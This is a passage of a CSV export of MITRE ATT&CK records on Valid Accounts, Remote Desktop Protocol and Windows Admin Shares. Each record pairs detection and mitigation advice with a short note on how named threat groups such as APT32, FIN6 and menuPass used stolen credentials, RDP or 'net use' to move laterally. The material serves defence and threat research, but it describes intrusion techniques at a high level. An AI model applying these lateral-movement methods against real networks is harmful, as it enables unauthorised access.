Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Cobalt Strike,"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1276,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0050|APT32]] has used legitimate local admin account credentials.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1277,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']","['To move laterally on a victim network, [[Group/G0037|FIN6]] has used credentials stolen from various systems on which it gathered usernames and password hashes.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1278,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['Some [[Software/S0053|SeaDuke]] samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[[CiteRef::Symantec Seaduke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: SeaDuke, SeaDaddy, SeaDesk","['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1279,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0045|menuPass]] has used valid accounts shared between Managed Service Providers and clients to move between the two environments.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1280,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1281,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used OWA account credentials to attempt to regain access to a victim network after eviction.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1282,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['The [[Group/G0001|Axiom]] group is known to have used RDP during operations.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1283,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['The [[Group/G0006|APT1]] group is known to have used RDP during operations.[[CiteRef::FireEye PLA]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1284,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Group/G0051|FIN10]] has used RDP to move laterally to systems in the victim environment.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1285,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",Software: Cobalt Strike,['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1286,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Group/G0037|FIN6]] used RDP to move laterally in victim networks.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1287,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware SierraCharlie uses RDP for propagation.[[CiteRef::Novetta Blockbuster RATs]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1288,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Group/G0045|menuPass]] has used RDP connections to move across the victim network.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1289,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['[[Group/G0040|Patchwork]] attempted to use RDP to move laterally.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],['Technique/T1076'],['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1290,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1291,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1292,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0009|Deep Panda]] uses net.exe to connect to network shares using ""net use"" commands with compromised credentials.[[CiteRef::Alperovitch 2014]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
